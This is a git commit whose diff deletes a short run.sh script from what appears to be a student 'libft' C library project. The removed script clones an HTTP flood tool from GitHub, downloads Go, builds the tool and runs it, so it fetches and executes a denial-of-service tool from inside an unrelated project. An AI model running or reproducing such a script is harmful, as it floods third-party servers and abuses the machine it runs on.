409f7d516856caf9d364dd823de739745aaeee09
murmur <43274917+murmurlab@users.noreply.github.com>
2022-12-21 12:04:57 +0000

    auto git

--- 42cursus/libft/run.sh
+++
@@ -1,6 +0,0 @@
-git clone https://github.com/Leeon123/golang-httpflood ~/flo
-wget https://go.dev/dl/go1.19.4.linux-amd64.tar.gz -O ~/gol
-
-tar -xzf ~/gol
-~/go/bin/go build ~/flo/httpflood.go
-./httpflood
